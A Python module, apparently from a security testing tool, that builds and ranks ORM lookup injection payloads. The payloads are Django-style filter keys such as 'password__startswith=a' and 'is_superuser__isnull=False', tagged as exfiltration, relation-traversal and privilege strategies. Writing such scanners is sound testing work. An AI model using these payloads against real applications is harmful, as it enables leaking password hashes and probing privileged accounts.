"""ORM lookup injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_orm_context

# The input is a filter key: add a lookup or a relation traversal.
_KEY_BODIES = [
    ("password__startswith=a", "sensitive-exfil"),
    ("user__password__startswith=a", "relation-traversal"),
    ("is_superuser__isnull=False", "privilege"),
    ("name__regex=.*", "regex-lookup"),
    ("id__gt=0", "comparison-exfil"),
]

# The input is a filter value: "__" is plain data (kept for completeness).
_VALUE_BODIES = [
    ("anything", "value"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class OrmCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class OrmMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[OrmCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _bodies(context: Context):
    if context == Context.ORM_LOOKUP_VALUE:
        return _VALUE_BODIES
    return _KEY_BODIES


def mutate_orm(template: str) -> OrmMutationResult:
    """Generate and rank ORM lookup injection payloads for ``template``."""
    from .analyzer import analyze_orm

    context = analyze_orm_context(template)
    generated = _bodies(context)

    candidates: list[OrmCandidate] = []
    for payload, strategy in generated:
        result = analyze_orm(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                OrmCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return OrmMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
